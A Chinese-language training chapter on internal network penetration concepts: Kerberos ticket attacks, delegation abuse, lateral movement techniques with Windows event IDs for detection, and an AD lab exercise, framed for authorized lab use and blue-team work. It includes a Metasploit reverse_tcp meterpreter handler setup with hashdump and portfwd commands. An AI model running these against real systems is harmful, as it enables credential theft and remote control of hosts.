# 04 · 内网渗透概念——从边界到域控的地图

> ⚠️ 本章全部为**概念与靶场级**内容。真实内网渗透必须有书面授权；这里学的是"攻击者如何思考网络"，为蓝队防御与护网研判服务。

## 🎯 学习目标

1. 画出从边界突破到域控的完整路径图
2. 说清 Kerberos 三子协议与两类票据
3. 理解委派攻击的三种类型（原理级）
4. 会用 MSF 管理会话（仅本地靶机）

## 📖 核心知识

### 4.1 全景路径图

```
[边界突破]        [立足]           [横向]            [目标]
Web RCE  ──→  Webshell/Beacon  ──→ 凭据收集 ──→  域控 (DC)
VPN 弱口令  →   内网直连     →   远程服务(PsExec等) → NTDS.dit
外网服务漏洞 →   提权至 SYSTEM →  委派/Relay     →  黄金票(概念)
```

每一层的防御问题（蓝队视角）：边界（暴露面管理）→ 立足（EDR/主机日志）→ 横向（域策略/凭据保护）→ 域控（特权访问模型）。

### 4.2 Kerberos 深入（第 2 次学，这次带攻击视角）

| 元素 | 说明 | 攻击面预告 |
|---|---|---|
| AS-REQ/REP | 密码验身→发 TGT | AS-REP Roasting（无预认证账户） |
| TGS-REQ/REP | TGT 换 ST | Kerberoasting（请求服务票离线破解服务账密） |
| TGT | 身份票（缓存在内存） | Pass-the-Ticket（窃票冒用） |
| ST | 服务票 | 服务端验票；**默认不验"请求者是否真持有 TGT"**——Relay 思路源头 |
| PAC | 票据里的权限声明 | PAC 伪造类历史漏洞 |

记忆锚点：Kerberos 的信任根是 **DC 的机器账户密钥**；一切票据攻击都是"让 DC 给我发一张它不该发的票"。

### 4.3 委派攻击（Delegation）三型

委派 = "服务 A 代表用户去访问服务 B"，Kerberos 对此的授权机制被滥用即成攻击面：

| 类型 | 机制 | 滥用要点 |
|---|---|---|
| 非约束委派 | 用户 TGT 被缓存到 A 的机器 | 让 DC 认证到 A → 白拿 DC 的 TGT |
| 约束委派 | 只允许 A 转发到指定 B 的特定服务 | 配置了 `AllowedToDelegate` 的账户可伪造转发 |
| 基于资源的约束 | B 的管理员配置"谁可委派到我" | 拿下 B 的写权限 → 配置自己为委派方 |

攻击者找委派配置：`Get-DomainUser -TrustedToAuth` 类查询（靶场/AD 模块）。蓝队：审查全部委派配置，默认应归零。

### 4.4 横向移动技术族谱（概念对比）

| 技术 | 载体 | 痕迹（蓝队检测点） |
|---|---|---|
| PsExec | SMB+服务安装 | 4688 进程创建、7045 服务安装、PSEXESVC |
| WMI | DCOM/RPC | wmiwp 进程、事件 4688 parent=WmiPrvSE |
| WinRM | 5985/5986 | PowerShell 日志 4104、wsmprovhost |
| RDP | 3389 | 登录 4624 type10、剪贴板外带 |
| DCOM | RPC |mmc20 等对象滥用 |

共性：都需要**凭据**——所以凭据保护（LSA 保护/凭据卫士/ tiered admin）是治本。

### 4.5 MSF 会话管理基础（仅本地靶机）

```bash
msfconsole
msf6> use exploit/multi/handler      # 监听器概念
msf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6> set LHOST 192.168.56.1; set LPORT 4444; run
meterpreter> getuid / hashdump / portfwd   # 会话内常用（VulnHub 靶机演示）
```

认知级理解 reverse shell（目标连你）vs bind shell（你连目标）与防火墙的关系：出站宽松入站严格 → reverse 常见 → 所以蓝队盯**出站异常连接**。

## 🔬 动手实操

本机搭 AD 靶场：Windows Server 2019 eval + Windows 10 eval，起域（2 台 4GB 内存即可，或用云上按小时计费）。完成：加域、建 OU/用户、抓一次登录事件 4624/4768。**没有 AD 环境的"内网学习"都是纸面谈兵。**

## ⚠️ 常见坑

1. 只在"网络图"上学内网——没有 AD 环境等于没学
2. 把 MSF 当魔法——每个模块背后是 4.4 表里某个机制
3. 攻击工具直接指向真实网络设备——红线；虚拟机网段隔离（Host-only）
4. 忽略蓝队视角——护网招聘要的恰恰是"懂攻击的防守研判"
5. 委派配置只背名字——手搭一次 AD 把三种委派配一遍才懂

## ✅ 自测题

<details>
<summary>1. 为什么横向移动都围绕"凭据"？</summary>

Windows 网络认证模型（NTLM/Kerberos）的通行证都是凭据或票据；拿到凭据=免漏洞走"正门"，这是比漏洞利用更稳的路径。

</details>

<details>
<summary>2. Kerberoasting 的原理一句话？</summary>

任何域用户可向 DC 申请服务的 ST（服务票用服务账户的密钥加密）→ 离线暴破该密钥 → 得服务账户明文密码。

</details>

<details>
<summary>3. 蓝队检测 PsExec 横向的三个事件？</summary>

4688（PSEXESVC 进程创建）、7045（服务安装）、目标机 4624 type3（网络登录，源为管理机）。

</details>

<details>
<summary>4. reverse shell 为什么比 bind shell 常见？</summary>

企业防火墙默认入站严格出站宽松；目标主动外连攻击者可穿过入站策略，无需在目标上开监听端口。

</details>

<details>
<summary>5. 非约束委派的危险在哪？</summary>

被委派服务器的内存会缓存"来访用户的 TGT"；诱导 DC 来访问它（如通过 Printerbug 类手法）即可缓存 DC 的 TGT，等于拿到 DC 身份。

</details>
